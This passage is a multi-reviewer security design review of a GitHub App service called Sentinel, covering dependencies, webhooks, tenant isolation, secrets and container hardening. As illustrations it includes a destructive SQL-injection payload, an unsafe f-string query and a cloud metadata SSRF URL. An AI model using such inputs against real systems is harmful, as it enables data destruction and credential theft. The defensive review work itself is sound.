The design introduces 8+ new runtime dependencies (FastAPI, arq, Redis, PostgreSQL, dulwich, PyJWT, httpx, uvicorn) and build-time tooling (uv for pinning). Mitigation is limited to 'Pin + hash-lock via uv; keep service deps behind the sentinel extra; Dependabot + SBOM.' No process described for pre-adoption vetting (typosquatting checks, maintainer reputation, SLSA provenance of dependencies), vulnerability scanning, or update/patch SLA. Several of these (FastAPI, dulwich, PyJWT) handle untrusted input and are complex attack surfaces. Redis and PostgreSQL are infrastructure dependencies with their own CVE streams. Dependabot alone is insufficient—it flags known CVEs but doesn't prevent malicious updates or 0-days.

**Likelihood:** Medium to High—Python dependency confusion and typosquatting attacks are frequent. Complex deps like dulwich (git protocol parsing) and FastAPI (HTTP parsing) have had CVEs. Redis <7.0 had multiple RCE vulnerabilities. Without proactive scanning, vulnerable versions could persist in production.

**Recommendation:** Implement a dependency acceptance process: verify package names against known typosquats, check maintainer/org reputation, require packages with SLSA provenance where available. Integrate automated CVE scanning (Grype, Trivy, Snyk) into CI to block vulnerable deps before merge. Run dep updates through security review, not just Dependabot auto-merge. Establish patch SLA (e.g., critical CVEs patched within 72 hours). Consider using a private PyPI mirror with allowlist. Pin not just direct deps but also transitive deps via lockfile hash verification.

**References:** SLSA Source Track, CWE-1395: Dependency on Vulnerable Third-Party Component, OWASP Dependency-Check, NIST SP 800-161: Cyber Supply Chain Risk Management

#### [MEDIUM] Dulwich (pure-Python Git library) introduces git protocol parsing attack surface

The design specifies using dulwich to fetch repos 'without shelling out' as a security measure. However, dulwich is a complex pure-Python implementation of the git protocol and object format, and has had security vulnerabilities (e.g., path traversal in clone operations). It parses attacker-controlled data from GitHub's git server. While GitHub's server is trusted, a MITM or compromised GitHub Enterprise instance could serve malicious git objects that exploit dulwich parsing bugs to achieve RCE in the worker.

**Likelihood:** Low to Medium—GitHub.com is a trusted source, but self-hosted GitHub Enterprise installations vary in security posture. Dulwich CVEs exist but are less frequent than in native git. The 'read-only FS, no network egress except git fetch' container mitigation reduces impact.

**Recommendation:** Evaluate whether dulwich's security posture is sufficient for this threat model—consider using libgit2 bindings (pygit2) which wrap a hardened C library with better security track record. If retaining dulwich, pin to latest patched version, enable all available paranoid parsing modes, and run the fetch in an isolated subprocess with minimal file descriptor inheritance. Implement per-fetch timeout and resource limits to contain DoS. Scan dulwich releases for CVEs before updating. If supporting GitHub Enterprise, document the requirement for TLS verification and disallow user-supplied clone URLs entirely.

**References:** CWE-20: Improper Input Validation, CWE-502: Deserialization of Untrusted Data, Git protocol CVE history (CVE-2022-39253, CVE-2022-41903)

#### [MEDIUM] SBOM generation and publication strategy undefined

The design mentions 'Dependabot + SBOM' once in the risks table but provides no specification for SBOM format (SPDX, CycloneDX), generation tooling, publication location, or update cadence. SBOMs are critical for downstream operators to assess their own supply chain risk, respond to CVE disclosures (knowing if they're running an affected version of a transitive dep), and meet compliance requirements (EO 14028, EU Cyber Resilience Act). Without SBOMs, users cannot audit the gate tool's dependencies, ironic given its purpose is to gate supply chain risk.

**Likelihood:** Certain—SBOMs are missing, so the capability gap exists today. The impact is operational: users can't assess risk or respond to incidents efficiently.

**Recommendation:** Generate SBOMs in both SPDX 2.3 (for compliance) and CycloneDX 1.5 (for vulnerability data) formats. Use syft or cdxgen in the CI build pipeline. Publish SBOMs alongside each GitHub release and Docker image (as an attestation or in-toto link). Include transitive dependencies and version hashes. Sign SBOMs with cosign. Document how users can retrieve and verify the SBOM. Update SBOMs on every release, including patch releases.

**References:** EO 14028: Improving the Nation's Cybersecurity, NTIA Minimum Elements for SBOM, SLSA Verification Track, OWASP SBOM guidance

#### [MEDIUM] Docker base image selection and patching not specified

The Sentinel service will run as a Docker container but the design does not specify a base image (e.g., python:3.11-slim, distroless, alpine). Base images are a common source of vulnerabilities—Debian/Ubuntu bases can carry hundreds of CVEs in OS packages unrelated to the app. The design also lacks a strategy for base image updates and patching. If using a standard Python image, the Sentinel container may ship with outdated system libraries (openssl, glibc, etc.) that have known exploits.

**Likelihood:** High—base image CVEs are extremely common and persist until explicitly patched. The default python:latest or python:3.x images lag behind security updates.

**Recommendation:** Use a minimal, hardened base image such as gcr.io/distroless/python3 (no shell, no package manager), cgr.dev/chainguard/python (minimal attack surface, frequent patches), or python:3.11-slim with explicit apt update && upgrade in the Dockerfile. Pin the base image by SHA256 digest, not tag. Scan the final image with Trivy or Grype in CI and fail builds on high/critical vulnerabilities. Rebuild and republish the Sentinel image monthly or on-demand when base image CVEs are disclosed. Use Docker HEALTHCHECK and read-only root filesystem in the deployment.

**References:** CWE-1395: Dependency on Vulnerable Third-Party Component, NIST SP 800-190: Container Security, CIS Docker Benchmark, OWASP Docker Security Cheat Sheet

#### [MEDIUM] Redis and PostgreSQL deployment security not addressed

Sentinel depends on Redis (for the arq job queue) and PostgreSQL (for findings storage) as infrastructure components, but the design does not discuss their security configuration, network isolation, authentication, or patch management. Redis prior to 7.0 had multiple RCE vulnerabilities (CVE-2022-24735, CVE-2023-28425). If Redis is exposed without authentication or with weak passwords, an attacker can execute Lua scripts or overwrite queue data to falsify scan results or DoS the gate. PostgreSQL injection risks exist if queries are not parameterized (though SQLAlchemy mitigates this). Unpatched DB instances are common targets.

**Likelihood:** Medium—Redis and PostgreSQL are frequently targeted when misconfigured. Default configurations often lack authentication or use weak defaults. Self-hosters may not apply patches promptly.

**Recommendation:** Document mandatory security configuration for self-hosters: Redis with requirepass, TLS, and bind to localhost or private network only; PostgreSQL with password authentication, TLS, and restricted pg_hba.conf. Provide Docker Compose or Kubernetes manifests with secure defaults (no default passwords, network policies isolating Redis/Postgres from the internet). Recommend using managed services (AWS RDS, ElastiCache) with automatic patching. Run Redis in append-only mode to limit Lua script abuse. Enable PostgreSQL audit logging. Include Redis and PostgreSQL patching in the security runbook with notification channels for CVEs.

**References:** CVE-2022-24735: Redis Lua sandbox escape, CVE-2023-28425: Redis integer overflow, CIS Redis Benchmark, CIS PostgreSQL Benchmark, OWASP: SQL Injection Prevention

#### [MEDIUM] No reproducible build or build provenance for CLI or Docker image

The design does not specify whether the CLI wheel or Sentinel Docker image are built reproducibly (bit-for-bit identical across builds). Without reproducibility, users cannot verify that a published artifact corresponds to the claimed source commit, opening the door to build-time compromises (dependency confusion during build, CI pipeline compromise, malicious build agent). No mention of build provenance (SLSA L2+) means users cannot audit who built the artifact, from what source, and in what environment.

**Likelihood:** Medium—CI compromise and build-time attacks are increasingly common (SolarWinds, Codecov). The lack of provenance makes detection impossible.

**Recommendation:** Implement reproducible builds for the Python wheel (use SOURCE_DATE_EPOCH, deterministic tar ordering). For Docker, use BuildKit with --provenance=true to generate SLSA provenance attestations. Publish provenance alongside releases. Build in GitHub Actions with OIDC token binding to prevent forgery. Use hatch-vcs for versioning (already noted) but ensure version embedding is deterministic. Encourage users to verify provenance with slsa-verifier or cosign. Long-term, target SLSA Build L3 (hardened, isolated build service).

**References:** SLSA Build L2/L3, Reproducible Builds project, CWE-494: Download of Code Without Integrity Check, NIST SP 800-218: SSDF

#### [LOW] Webhook endpoint lacks rate limiting and DoS protection

The webhook receiver will be exposed to the internet to receive GitHub events. While HMAC verification prevents forgery, a malicious actor could replay valid webhooks (if they capture one before X-GitHub-Delivery dedupe) or flood the endpoint with invalid requests to DoS the service, preventing legitimate PRs from being scanned. The design mentions dedupe on delivery ID but does not discuss rate limiting, request size caps, or queue backpressure.

**Likelihood:** Low to Medium—requires stealing a valid webhook or having GitHub send duplicates. Impact is primarily DoS (gate unavailable), not compromise, but could be used to sneak malicious PRs through if the gate is down.

**Recommendation:** Implement rate limiting on the webhook endpoint (per source IP and per installation ID). Cap request body size to prevent memory exhaustion. Use a sliding window or token bucket for queue admission to prevent unbounded queueing. Monitor queue depth and alert on anomalies. Consider using GitHub's webhook retry backoff as a signal to shed load. Ensure the delivery ID dedupe store (Redis?) is persistent and bounded to prevent memory exhaustion from unique delivery IDs.

**References:** OWASP API Security Top 10: API4 - Lack of Resources & Rate Limiting, CWE-770: Allocation of Resources Without Limits or Throttling, NIST SP 800-61: Incident Handling

**Recommendations:**

- Establish a software supply chain security policy for the project itself, covering dependency acceptance criteria, SBOM publication, vulnerability disclosure, and incident response. Dogfood the tool: run entrygraph gate on its own PRs.
- Create a security.md in the repo with the vulnerability disclosure process, expected response time, and PGP key. Join OpenSSF and consider contributing to Alpha-Omega for ongoing security review.
- For SaaS deployment (future), implement multi-tenancy isolation at the infrastructure level (separate VPCs/namespaces per customer), encrypt findings at rest with per-tenant keys, and pursue SOC 2 Type II and ISO 27001 certification.
- Publish a threat model diagram showing trust boundaries (GitHub, Sentinel worker, Redis, Postgres, customer code) and the attack surface of each component. Use this to prioritize hardening efforts.
- Provide a 'security-first' quick-start for self-hosters that uses distroless images, minimal permissions, network policies, and secrets from a vault—make secure-by-default easier than insecure.

**Open Questions:**

- What is the update mechanism for self-hosted Sentinel instances? Are updates manual (pull new image) or automatic (version check + auto-update)? If automatic, how is update integrity verified to prevent malicious update injection?
- How are findings and baselines retained and purged? If a customer uninstalls the GitHub App, are their findings deleted immediately or retained for audit? What's the data retention policy, and does it meet GDPR Article 17 (right to erasure)?
- Will the CLI wheel and Sentinel image be published to PyPI and Docker Hub (public) or a private registry? If public, how is namespace squatting prevented (e.g., someone uploading a malicious 'entrygraph' package before the official one)?
- What is the disaster recovery plan if the GitHub App private key is compromised? Is there a revocation + re-issuance process, and how do existing installations migrate?
- Are there plans for FIPS 140-2 compliance for cryptographic operations (hashing, HMAC, TLS) in regulated environments (government, finance)?

### Threat Model Engineer

The Continuous Reachability Gate introduces meaningful attack surface through webhook ingestion, untrusted code analysis, multi-tenant data isolation, and GitHub App credential management. The core insight—entrygraph never executes code—is a strong foundation, but several high-severity threats remain around baseline integrity, tenant isolation, webhook authenticity, and resource exhaustion. The spec already acknowledges many risks; this assessment prioritizes them through STRIDE and identifies gaps in the proposed mitigations.

**Confidence:** high

#### [CRITICAL] Multi-tenant installation_id/repo_id authorization bypass in REST API

The spec mentions 'Every query scoped by installation_id / repo_id; row-level authorization checks' but provides no implementation detail for the Sentinel REST API (sentinel/api.py). If authorization is not enforced at every endpoint—for example, if an authenticated user can supply an arbitrary scan_id or repo_id in a GET request and the system only validates authentication (not ownership)—then one installation could read findings, suppressions, or baselines belonging to another. The risk is especially high if API authentication relies on shared secrets or allows installation-token-derived auth without strict binding to the installation's repo scope.

**Likelihood:** High if API authentication is weak or authorization checks are missing. This is a common implementation flaw in multi-tenant systems.

**Recommendation:** Implement mandatory row-level authorization middleware that validates every scan_id, repo_id, and suppression_id parameter against the authenticated principal's installation_id and permitted repo set before executing the query. Use parameterized queries with installation_id in the WHERE clause for all SELECT/UPDATE/DELETE operations. Add integration tests that attempt cross-tenant access and verify 403 responses. Consider using SQLAlchemy's session-scoped filters or a database view that automatically restricts rows by installation context.

**References:** CWE-639: Authorization Bypass Through User-Controlled Key, OWASP API Security Top 10 - API1:2023 Broken Object Level Authorization, CWE-862: Missing Authorization

#### [HIGH] Baseline poisoning via pull_request webhook race condition

A malicious actor who can submit PRs could exploit the timing between baseline refresh and merge to inject dangerous paths into the baseline. The spec states 'Baselines only refresh from the protected default branch after merge,' but the sequenceDiagram shows the worker fetching base_sha from the webhook payload. If an attacker can manipulate which commit is treated as 'base' (e.g., via a force-push race or webhook replay with a stale base_sha), they could cause a dangerous path to appear 'known' rather than 'new,' bypassing the gate on subsequent PRs.

**Likelihood:** Moderate. Requires attacker to have write access (to create PRs) and precise timing, but the payoff is persistent bypass of the gate for all future PRs introducing the same path.

**Recommendation:** Never trust base_sha from the webhook payload for baseline retrieval. Instead, the worker should query GitHub's API for the current HEAD of the default protected branch (e.g., refs/heads/main) at scan time and use that commit as the baseline reference. Add a database constraint ensuring Baseline.branch matches the repo's configured default branch and that commit_sha is verified against GitHub's ref API. Log baseline retrievals for audit.

**References:** CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition, MITRE ATT&CK T1565.001: Data Manipulation - Stored Data Manipulation

#### [HIGH] GitHub App private key and webhook secret stored in environment risk exposure via logs or error traces

The spec states 'Secrets from env/secret manager only, never in the DB or logs' but does not define how sentinel/github.py or sentinel/webhook.py will prevent accidental logging. Python exception traces, debug logs, and FastAPI's default error responses can leak environment variables or in-memory secrets if not carefully sanitized. An attacker who gains read access to application logs (via SSRF, log aggregation service compromise, or container escape) could extract the App private key and impersonate the installation across all repos.

**Likelihood:** Moderate. Accidental secret logging is common in web services, especially during initial deployment or when handling unexpected errors.

**Recommendation:** Wrap all secret retrieval in a SecretStr or custom Secret class that overrides __repr__ and __str__ to return '[REDACTED]'. Configure FastAPI exception handlers to sanitize environment variables from tracebacks (e.g., filter os.environ keys). Use structured logging (e.g., structlog) and explicitly exclude secret fields. Add a pre-commit hook that scans code for os.getenv('GITHUB_APP_PRIVATE_KEY') without redaction. Store secrets in a dedicated secret manager (e.g., HashiCorp Vault, AWS Secrets Manager) with audit logging, not plain environment variables. Implement secret rotation with a documented runbook and zero-downtime rollover.

**References:** CWE-532: Insertion of Sensitive Information into Log File, OWASP Top 10 2021 A05: Security Misconfiguration

#### [HIGH] Webhook HMAC verification vulnerable to timing attack and replay

The spec requires HMAC verification of X-Hub-Signature-256 and deduplication on X-GitHub-Delivery, but does not specify constant-time comparison for the HMAC or a TTL for delivery ID deduplication. A timing side-channel in HMAC comparison could leak the webhook secret byte-by-byte. Additionally, if X-GitHub-Delivery deduplication uses an unbounded in-memory cache or database without expiry, an attacker who captured a valid signed webhook could replay it days later (after the cache evicts due to size or restart) to trigger spurious scans or DoS the worker queue.

**Likelihood:** Moderate for timing attack (requires attacker to send many probes); moderate-to-high for replay if deduplication state is not persistent or TTL'd.

**Recommendation:** Use hmac.compare_digest() for constant-time HMAC comparison in sentinel/webhook.py. Store X-GitHub-Delivery IDs in Redis (or Postgres) with a TTL (e.g., 24 hours) and reject any delivery_id seen within that window. Add a timestamp check: reject webhooks where the current time exceeds the event timestamp by more than 5 minutes. Implement rate limiting per installation_id (e.g., max 100 webhooks/hour) to mitigate brute-force replay attempts. Log rejected webhooks with the failure reason for monitoring.

**References:** CWE-208: Observable Timing Discrepancy, CWE-294: Authentication Bypass by Capture-replay, OWASP ASVS 9.2.1: Webhook Signature Verification

#### [HIGH] SQL injection in findings queries if fingerprint or path_json are unsanitized

The Finding.fingerprint and Finding.path_json columns store data derived from the scanned code (symbol qnames, file paths). If any component (gate/store.py, sentinel/api.py) constructs SQL queries by string concatenation rather than parameterized queries—especially when filtering by fingerprint or searching path_json—an attacker who controls symbol naming in the PR could inject SQL. For example, a Python function named `'; DROP TABLE findings; --` in the scanned code could end up in path_json and be unsafely interpolated into a query.

**Likelihood:** Low if SQLAlchemy ORM is used correctly with bound parameters, but high impact if raw SQL or string formatting is used anywhere.

**Recommendation:** Mandate SQLAlchemy ORM queries with bound parameters exclusively in gate/store.py and sentinel/api.py; ban db.execute(f"SELECT * FROM findings WHERE fingerprint='{fp}'"). Add a linter rule (e.g., Semgrep or Bandit) that flags raw SQL string formatting. Sanitize all user-controlled input (fingerprint, path_json, reason) before storage: validate fingerprints are 32-char hex, reject newlines/semicolons in path_json. Use SQLAlchemy's text() with bindparams for any unavoidable raw SQL. Enable PostgreSQL's prepared statement logging and audit for interpolated queries. Run a static analysis pass (sqlalchemy-stubs, mypy strict mode) to catch unsafe query construction.

**References:** CWE-89: SQL Injection, OWASP Top 10 2021 A03: Injection, OWASP SQL Injection Prevention Cheat Sheet

#### [MEDIUM] Untrusted PR code analysis resource exhaustion via malicious parse targets

The spec acknowledges that entrygraph never executes code, but a malicious PR could still craft pathological source files to exhaust CPU, memory, or disk during tree-sitter parsing or graph construction. Examples: deeply nested expressions (exponential parse time), extremely large files (gigabytes of repetitive code), or files with millions of symbols (SQLite index explosion). The proposed mitigation—'per-file size caps, total time budget, max-nodes limits'—is mentioned but not specified in the worker implementation.

**Likelihood:** Moderate-to-high. Attackers with PR access could DoS the gate to prevent any PRs from being scanned, effectively disabling the security control.

**Recommendation:** Enforce strict resource limits in sentinel/worker.py before invoking entrygraph: (1) max file size 5MB, (2) total checkout size 500MB, (3) per-file parse timeout 10s, (4) max graph nodes 1M symbols per scan. Run the worker in a cgroup or container with memory limit (2GB) and CPU quota. If a scan exceeds limits, mark ScanRun.status='error', post a neutral Check Run with a message explaining the limit, and do not block the PR (fail-open to avoid DoS-based bypass). Log limit violations by repo_id for abuse detection. Consider sampling: scan only changed files in the PR head, not the entire repository.

**References:** CWE-400: Uncontrolled Resource Consumption, CWE-1333: Inefficient Regular Expression Complexity, OWASP DoS Cheat Sheet

#### [MEDIUM] SSRF via repository clone URL manipulation in GitHub App integration

The spec states 'Only fetch repos the installation grants... never a user-supplied URL; deny-list internal CIDRs at egress proxy,' but the worker must construct a git clone URL from the webhook payload's repository.clone_url or repository.html_url fields. If GitHub's API is compromised or an attacker can inject a malicious repository object (e.g., via a GitHub Enterprise bug), the worker could be tricked into fetching from an internal URL (e.g., http://169.254.169.254/latest/meta-data/). The deny-list approach is fragile because cloud metadata services and internal services may have non-obvious IPs.

**Likelihood:** Low. Requires GitHub API compromise or a bug in GitHub's webhook payload validation, but impact is high (credential theft, internal network scan).

**Recommendation:** Fetch repositories exclusively via the GitHub API using the installation token, not by directly cloning a URL from the webhook payload. Use the GitHub REST API endpoint GET /repos/{owner}/{repo} to retrieve the canonical clone URL, then validate it matches the pattern https://github.com/{owner}/{repo}.git (or your GitHub Enterprise domain). Implement an allow-list: only github.com and your enterprise hostname. Run the worker in a network namespace or VPC with no route to internal networks; use an egress proxy that blocks RFC1918 and link-local addresses. Log all git fetch operations with the resolved IP for monitoring.

**References:** CWE-918: Server-Side Request Forgery (SSRF), OWASP SSRF Prevention Cheat Sheet, MITRE ATT&CK T1071.001: Application Layer Protocol - Web Protocols

#### [MEDIUM] Fingerprint collision or instability undermines gate integrity

Path fingerprints are the keystone of baseline diffing. The spec proposes blake2b over (source_category, sink_id, tuple(symbol.qname)). If two distinct dangerous paths produce the same fingerprint (collision), the gate will fail to report one as 'new.' If a benign refactor changes qnames (e.g., renaming a module or function), the same path is flagged as both 'fixed' and 'new,' creating noise. The 'endpoint' fuzzy fallback helps but introduces risk: a genuinely new high-risk path could match an old low-risk path at the endpoint level and be mis-classified as 'known.'

**Likelihood:** Moderate. Fingerprint instability is cited as a key risk; collisions are unlikely (blake2b-128 is collision-resistant) but qname changes are common in refactors.

**Recommendation:** Version the fingerprint algorithm (include 'fp_version:1' in the hash input) so future improvements don't invalidate baselines. Add a secondary 'semantic hash' that includes normalized AST snippets of the source and sink call sites (e.g., first 3 AST node types) to disambiguate collisions. For the fuzzy 'endpoint' match, require risk score and sink_id to be within 10% before accepting the match; if they diverge, treat as 'new' and flag for manual review. Build a regression test suite with 50+ known refactors (rename, move file, extract function) and assert fingerprints remain stable or gracefully degrade to endpoint match. Expose a CLI command 'entrygraph gate explain-match <fingerprint>' to show why a path was classified as known/new.

**References:** CWE-328: Use of Weak Hash, NIST SP 800-107: Recommendation for Applications Using Approved Hash Algorithms

#### [MEDIUM] Suppression abuse: permanent waivers for critical findings without expiry or review

The Suppression table includes an optional expires_at TTL, but the spec does not mandate expiry or define a review process. If a developer can suppress a critical command-injection path indefinitely (expires_at=NULL) via the API without peer review, the gate becomes ineffective. The spec mentions 'suppressions require review via CODEOWNERS on a checked-in policy file,' but this is only stated for baseline poisoning, not for runtime API-created suppressions.

**Likelihood:** Moderate. Social engineering or compromised developer accounts could lead to dangerous suppressions being silently added.

**Recommendation:** Require all Suppression records to have a non-null expires_at with a maximum TTL (e.g., 90 days). For critical or high-severity findings (risk >= 0.8), enforce a two-person approval workflow: suppressions must be requested via PR to a .entrygraph/suppressions.yaml file in the repo, approved by CODEOWNERS, and synced to the database by Sentinel on merge. API-created suppressions should be limited to informational/low severity and automatically expire in 30 days. Log all suppression creations with created_by and reason; export to an audit log or SIEM. Implement a monthly report of active suppressions per repo sent to security teams.

**References:** CWE-1390: Weak Authentication, NIST SP 800-53 AC-3: Access Enforcement, CIS Control 6.8: Regularly Review User Access

#### [MEDIUM] Redis job queue (arq) lacks authentication and encryption in transit

The spec specifies arq + Redis for the async job queue but does not address Redis authentication or TLS. If Redis is deployed without AUTH or network isolation, an attacker who gains network access to the Redis port (6379) can enqueue arbitrary scan jobs, read job payloads (which include repo_id, installation_id, commit SHAs), or delete queued jobs to DoS the gate. Job payloads may also contain sensitive metadata if not carefully sanitized.

**Likelihood:** Moderate in cloud deployments where Redis is accidentally exposed or shared across services; low in properly firewalled environments.

**Recommendation:** Enable Redis AUTH with a strong password (32+ random chars) and configure arq to use it. Enforce TLS for all Redis connections (requirepass + tls-port in redis.conf). Deploy Redis in a private subnet or container network inaccessible from the public internet. Use Redis ACLs (6.0+) to restrict the arq worker user to only the required commands (LPUSH, BRPOP, DEL on the job queue key). Avoid including sensitive data in job payloads; store only job_id and fetch details from Postgres in the worker. Rotate Redis passwords quarterly. Monitor Redis logs for unauthorized connection attempts.

**References:** CWE-306: Missing Authentication for Critical Function, CWE-319: Cleartext Transmission of Sensitive Information, OWASP ASVS 2.2.1: Authentication Credentials are Encrypted in Transit

**Recommendations:**

- Implement a comprehensive integration test suite that exercises adversarial scenarios: webhook replay, cross-tenant API access, malicious parse payloads, and baseline TOCTOU races. This should run in CI on every PR to sentinel/.
- Add structured audit logging for all security-critical events: baseline updates, suppressions created/expired, installation token generation, webhook rejections, and scan failures. Export logs to a tamper-evident sink (e.g., AWS CloudTrail, Splunk).
- Build a security runbook covering: secret rotation (App private key, webhook secret, Redis password), incident response (detected forgery, data leak), and graceful degradation (fail-open vs. fail-closed for gate failures).
- Publish a threat model document alongside deployment docs, explicitly mapping the proposed mitigations to STRIDE threats and CWEs. Include a section on the shared responsibility model for self-hosters (network isolation, secret management, database encryption).
- Harden the worker sandbox: run in a minimal distroless container with read-only root filesystem, drop all capabilities, and use seccomp to block syscalls (e.g., execve, ptrace). This limits blast radius if a parser bug allows code execution.
- Implement defense-in-depth for multi-tenancy: in addition to application-level authz, use PostgreSQL row-level security (RLS) policies to enforce installation_id filtering at the database layer. This prevents bugs in the ORM from bypassing authz.
- Add a rate-limiting middleware in sentinel/webhook.py and sentinel/api.py to mitigate brute-force and DoS: e.g., 100 webhooks/hour per installation_id, 1000 API requests/hour per authenticated principal.
- For SaaS hardening (future work), plan for: encryption-at-rest for graph/findings (AES-256), per-tenant database isolation or encryption keys, SOC 2 Type II audit, GDPR DPA templates, and a bug bounty program.

**Open Questions:**

- How is authentication handled for the Sentinel REST API? Is it GitHub OAuth, installation tokens, or a separate API key? Without this, the authz threat cannot be fully assessed.
- What is the recovery mechanism if the baseline database is corrupted or lost? Can baselines be reconstructed from historical git commits, or does this require a new 'initial baseline' scan?
- How does the system handle merge commits vs. squash-and-merge? A squashed commit has a different SHA than the PR head, which could cause baseline mismatches.
- Is there a plan for blue/green deployment or canary rollout of Sentinel to avoid downtime during upgrades? This affects availability risk.
- What happens if GitHub's API is unavailable when the worker tries to fetch a repository or post a Check Run? Is there retry logic, and does a transient failure cause the gate to fail-open or fail-closed?
- How are `dulwich` or `git` invocations sandboxed to prevent command injection if repository metadata (e.g., branch names) contain shell metacharacters?

### Cloud Security Engineer

The Continuous Reachability Gate proposal presents a well-thought-out security analysis tool with strong architectural separation between CLI and service components. Key cloud security strengths include webhook HMAC verification, scoped installation tokens, and the fact that code is parsed but never executed. However, the proposal lacks critical operational security details around secret management infrastructure, network architecture, container hardening specifications, incident response procedures, and comprehensive audit logging. The multi-tenant isolation strategy needs more concrete implementation details, and the self-hosted deployment model shifts significant security responsibility to operators without providing hardening guidance or infrastructure-as-code templates.

**Confidence:** high

#### [HIGH] GitHub App Private Key Storage and Rotation Mechanism Unspecified

The proposal states that the GitHub App private key and webhook secret must come from 'env/secret manager only' but does not specify which secret management solution, how keys are injected into containers, rotation procedures, or access controls. The private key grants the ability to generate installation tokens for all repos where the app is installed. If this key is compromised, an attacker can access all customer repositories and manipulate Check Runs across the entire installation base. The proposal mentions a 'key rotation runbook' as a mitigation but provides no details on automation, frequency, or zero-downtime rotation procedures.

**Likelihood:** Medium - While the proposal acknowledges the risk, the lack of concrete implementation details means deployments may use insecure patterns (environment variables in container definitions, secrets in ConfigMaps, inadequate rotation). Self-hosted deployments are particularly vulnerable if operators lack secret management expertise.

**Recommendation:** Specify a concrete secret management architecture: (1) Require integration with a proper secret manager (AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, HashiCorp Vault) with short TTL automatic rotation; (2) Use workload identity/IAM roles for secret access rather than long-lived credentials; (3) Never pass secrets via environment variables - use mounted secret volumes or init containers; (4) Implement automated 90-day key rotation with overlap period; (5) Provide Terraform/Helm templates demonstrating secure secret injection; (6) Document emergency revocation procedures. Add automated alerting on failed rotation attempts.

**References:** CWE-798: Use of Hard-coded Credentials, CWE-320: Key Management Errors, NIST SP 800-57: Recommendation for Key Management, CIS Docker Benchmark 5.10: Ensure secrets are not stored in container images

#### [HIGH] Insufficient Container Isolation and Resource Limits for Untrusted Code Analysis

The worker analyzes untrusted PR code from any repository where the GitHub App is installed. While the proposal correctly notes that entrygraph 'never executes code' and parsing is safer than execution, the tree-sitter parsing layer still processes attacker-controlled input. A maliciously crafted repository could include pathological code structures designed to exhaust CPU/memory during parsing (billion laughs attack, deeply nested structures, exponential backtracking in grammars). The proposal mentions 'per-file size caps, total time budget, max-nodes limits' and 'locked-down container (read-only FS, no network egress except git fetch)' but provides no specific values, enforcement mechanisms, or container security configurations (seccomp profiles, AppArmor/SELinux policies, capability dropping).

**Likelihood:** Medium-High - Parsing untrusted input is a well-known attack surface. Tree-sitter has had vulnerabilities (CVE-2022-45299, exponential parsing issues). Without concrete resource limits, a single malicious PR can DoS the entire scanning service, blocking legitimate PRs across all installations.

**Recommendation:** Implement defense-in-depth container hardening: (1) Run worker containers with minimal privilege (non-root user, read-only root filesystem, no new privileges, drop all capabilities); (2) Apply strict seccomp profile allowing only essential syscalls; (3) Enforce hard resource limits: 2 CPU cores, 4GB memory, 30-minute timeout per scan; (4) Implement per-file limits: 10MB max file size, 1000 file max per repo, 100k LOC max; (5) Use network policies to deny all egress except GitHub API (allowlist CIDR/domain); (6) Deploy workers in isolated namespace/VPC with no access to databases or secrets; (7) Implement circuit breakers: auto-suspend repositories triggering repeated timeouts; (8) Add structured logging of resource usage metrics per scan for anomaly detection.

**References:** CWE-400: Uncontrolled Resource Consumption, CWE-834: Excessive Iteration, OWASP: Denial of Service, CIS Docker Benchmark 5.1-5.3: Container user, privilege, and capability restrictions, NIST SP 800-190: Application Container Security Guide

#### [HIGH] Multi-Tenant Data Isolation Relies on Application-Layer Enforcement Without Defense-in-Depth

Sentinel stores source code graphs, reachability paths, and findings for multiple organizations in a shared PostgreSQL database. The proposal states that 'every query scoped by installation_id / repo_id' with 'row-level authorization checks,' but this relies entirely on application logic correctness. A SQL injection vulnerability, ORM query bug, or logic error in the API authorization layer could expose one organization's findings (which contain detailed code structure information) to another. The proposal does not mention database-level isolation mechanisms (row-level security policies, separate schemas per tenant, encrypted columns with tenant-specific keys), connection pooling security, or least-privilege database users. For a self-hosted multi-tenant service handling sensitive customer code, application-only isolation is insufficient.

**Likelihood:** Medium - While SQLAlchemy with parametrized queries reduces SQL injection risk, authorization bugs are common. The API layer (FastAPI) will have many query paths, and a single missing authorization check exposes tenant data. The 'per-install encryption-at-rest option' suggests this is optional rather than default.

**Recommendation:** Implement defense-in-depth for multi-tenancy: (1) Enable PostgreSQL Row-Level Security (RLS) policies enforcing installation_id isolation at the database level, independent of application logic; (2) Use separate database users per service component with grants limited to required tables only; (3) Make encryption-at-rest mandatory using PostgreSQL transparent data encryption (TDE) or application-layer encryption with per-tenant keys stored in KMS; (4) Add SQL query logging and anomaly detection for cross-tenant access attempts; (5) Implement comprehensive authorization tests covering all API endpoints and query paths; (6) Consider schema-per-tenant architecture for stronger isolation; (7) Add audit logging of all findings/graph access with automated alerting on unexpected cross-tenant queries; (8) Document data residency options for compliance (GDPR, SOC2).

**References:** CWE-566: Authorization Bypass Through User-Controlled SQL Primary Key, CWE-639: Authorization Bypass Through User-Controlled Key, OWASP: Insecure Direct Object Reference, OWASP: Multi-Tenancy Security, NIST SP 800-53: SC-4 Information in Shared Resources

#### [MEDIUM] SSRF Risk in Git Clone Operations with Insufficient URL Validation

The worker fetches git repositories via dulwich or 'constrained git invocation' using URLs derived from GitHub API responses for the installation. While the mitigation states 'only fetch repos the installation grants, using the installation token and GitHub's clone URL — never a user-supplied URL; deny-list internal CIDRs at the egress proxy,' the implementation details are absent. If the worker constructs clone URLs from untrusted fields (e.g., a repository fork's parent URL) or GitHub Enterprise Server deployments with custom domains, an attacker could potentially trigger fetches to internal network resources (metadata services, internal git servers, admin interfaces). The proposal mentions an 'egress proxy with CIDR deny-lists' but does not specify whether this is mandatory, how it's implemented, or whether it's part of the deployment templates.

**Likelihood:** Low-Medium - The attack surface is limited because GitHub API responses are the source, and installation tokens scope access. However, GitHub Enterprise Server deployments, repository transfer/fork edge cases, and subdomain takeover scenarios could create opportunities. The use of dulwich (pure Python) is safer than shelling out to git, but URL parsing and redirect following can still introduce vulnerabilities.

**Recommendation:** Implement strict allowlisting for git operations: (1) Parse and validate all clone URLs against a strict allowlist of GitHub domains (github.com, githubusercontent.com, specific GHES instances); (2) Reject URLs with IP addresses, private IP ranges (RFC1918, 169.254.0.0/16, localhost), or suspicious ports; (3) Use dulwich with disabled redirect following and explicit timeout; (4) Deploy mandatory network-layer egress filtering (security group/network policy) that denies all traffic except GitHub API/git endpoints (allowlist by FQDN, not CIDR); (5) Implement request inspection logging for all git operations including resolved IPs; (6) Add integration tests simulating SSRF attempts (metadata service IPs, internal domains); (7) For GHES deployments, require explicit URL registration in Sentinel configuration.

